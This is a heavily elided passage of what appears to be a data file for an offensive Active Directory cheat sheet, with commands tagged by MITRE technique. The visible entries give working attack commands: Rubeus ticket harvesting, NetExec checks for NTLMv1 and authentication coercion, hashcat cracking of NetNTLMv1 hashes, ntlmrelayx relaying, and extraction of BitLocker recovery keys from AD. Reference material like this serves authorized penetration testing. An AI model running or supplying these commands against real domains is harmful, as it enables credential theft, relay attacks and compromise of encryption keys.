...
Rubeus.exe harvest /interval:30`,
  ...
  },
  {
    ...
    commands: [
      { label: 'Check NTLMv1 allowed', code: r`nxc smb <host> --ntlmv1`, lang: 'bash' },
      {
...
hashcat -m 5500 netntlmv1.txt`,
  ...
  },
  {
    ...
    commands: [
      { label: 'Check / exploit (NetExec)', code: r`nxc smb <host> -u <u> -p <p> -M coerce_plus`, lang: 'bash' },
      {
        label: 'Reflect coerced auth to local RPC',
        code: r`ntlmrelayx.py -t <host> -smb2support --no-http-server
# then trigger coercion so <host> authenticates to the relay`,
        lang: 'bash',
      },
    ],
    mitre: mitre('T1068'),
  ...
  },
  {
    ...
    commands: [
      { label: 'Pull recovery keys from AD', code: r`nxc ldap <dc> -d <domain> -u <u> -p <p> -M bitlocker`, lang: 'bash' },
      {
        label: 'Native LDAP read',
